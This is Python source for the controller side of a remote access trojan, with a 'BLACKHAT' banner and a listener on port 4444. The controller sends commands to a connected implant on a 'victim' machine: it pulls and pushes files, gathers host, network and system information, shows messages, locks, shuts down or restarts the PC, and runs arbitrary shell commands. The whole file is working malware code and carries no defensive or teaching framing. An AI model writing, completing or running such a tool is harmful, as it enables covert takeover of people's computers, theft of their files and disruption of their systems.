import socket, json, base64, colorama

colorama.init()
BLACKHAT = """
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@#G&@@@@@@@@@#Y5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@5. .?#@@@@@B7.  !@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@G     .?5PY~      5@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@^                 :&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@5                   ?@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@^                    B@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@P                     7@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@!                      B@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@#.                      7@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@&5J?7!~^^^::::.:::^~!7?YG@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@&BGG#&@@@@@@@@@@@@@@@@@@@@&#GGB#&@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@#BPY?!~:.   .:^!7?JYY5555555YJ?7!^:.   .:^!?J5G#&@@@@@@@@@@@@@@
@@@@@@@#PJ!^.                                               :~75B&@@@@@@@@@
@@@@@@5.                                                        .Y@@@@@@@@@
@@@@@@@B5?~^.                                             .:^~?P#@@@@@@@@@@
@@@@@@@@@@@@&#GPYJ?!~^::...                  ...::^~!?J5PB#&@@@@@@@@@@@@@@@
@@@@@@@@@@@@@&57?JY5P@@GPGGGGGGPPPPPPPPGGGGBBBGPB@@B55YJ7!JB@@@@@@@@@@@@@@@
@@@@@@@@@@@B?.       J@J ..:^^~~~~7YY?~~~~~~^:. P@B.        ^JB@@@@@@@@@@@@
@@@@@@@@&5~           J@?:      :Y&@@&Y:      :J@#:            ^JB@@@@@@@@@
@@@@@@B?.              !@@G5YY5G&@@@@@@@G555GB@@&^                :?B@@@@@@
@@@@@@BPP5Y?!~^.        :G@@@@@@@@@@@@@@@@@@@@&Y^         .:^~7?Y5PPB@@@@@@
@@@@@@@@@@@@@@@&BG5J7^    ?&@@@@@@@@@@@@@@@@B7.     :~7JPG#&@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@&Y^     :5@@@@@@@@@@@@@B7       .7P#@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@&P!          ^5&@@@@@@@@&J.            ^?P@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@#J!^.          :J#@@@@@P^         .~7YPGB&@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@&GY7^.       .7P@@Y       .!YG&@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@#P?~.     ~@J     :?P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GJ!: G5    !P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&B#.  !B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y :P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@?!&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
                         _       _              _     
           _ __  __ _ __| |___  | |__ _  _   __(_)_ _ 
          | '  \/ _` / _` / -_) | '_ \ || | (_-< | '_|
          |_|_|_\__,_\__,_\___| |_.__/\_, | /__/_|_|  
                                      |__/
"""
print(colorama.Fore.RED + BLACKHAT)
print(colorama.Style.RESET_ALL)

# Set the commands as a 2D array with descriptions for modularity
commands = [
    ["exit", "Exits the connection on both sides"],
    ["cd", "Changes the active directory"],
    ["download", "Downloads files from the client"],
    ["upload", "Uploads files from the server to the client"],
    ["gethostname", "Gets the name of the victims computer"],
    ["netstat", "See all the ports from the victim"],
    ["IP", "Shows The Victims IP Address"],
    ["sysinfo", "See The Info Of The System"],
    ["message", "Shows a message box on the client users screen"],
    ["lock", "Puts the client user back to the login screen"],
    ["shutdown", "Shutsdown the client users PC, will close connection"],
    ["restart", "Restarts the client users PC"],
    ["ratHelp", "Displays this list"],
]


def helpCommand():
    total = 0
    print("\nCommands: \n")
    # Simple loop to send a description of all commands
    for x in commands:
        print(f"[{total}] {commands[total][0]} - {commands[total][1]}")
        total += 1
    print("[∞] Anything - will run a command on the users PC like command prompt\n")


class Server:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print(colorama.Fore.RED)
        print(" [-] Waiting for a connection...")
        print(colorama.Style.RESET_ALL)
        self.connection, address = server.accept()
        print(colorama.Fore.GREEN)
        print(" [+] Connected With " + str(address))
        print(colorama.Style.RESET_ALL)
        helpCommand()

    def dataReceive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def dataSend(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    def executeRemotely(self, command):
        self.dataSend(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.dataReceive()

    def readFile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def writeFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete"

    def run(self):
        while True:
            command = input(">>> ")
            command = command.split(" ", 1)
            try:
                if command[0] == "upload":
                    fileContent = self.readFile(command[1]).decode()
                    command.append(fileContent)
                result = self.executeRemotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.writeFile(command[1], result)
                elif command[0] == "ratHelp":
                    helpCommand()
            except Exception:
                result = "[-] Error running command, check the syntax of the command."
            print(result)


activeServer = Server("127.0.0.1", 4444)
activeServer.run()
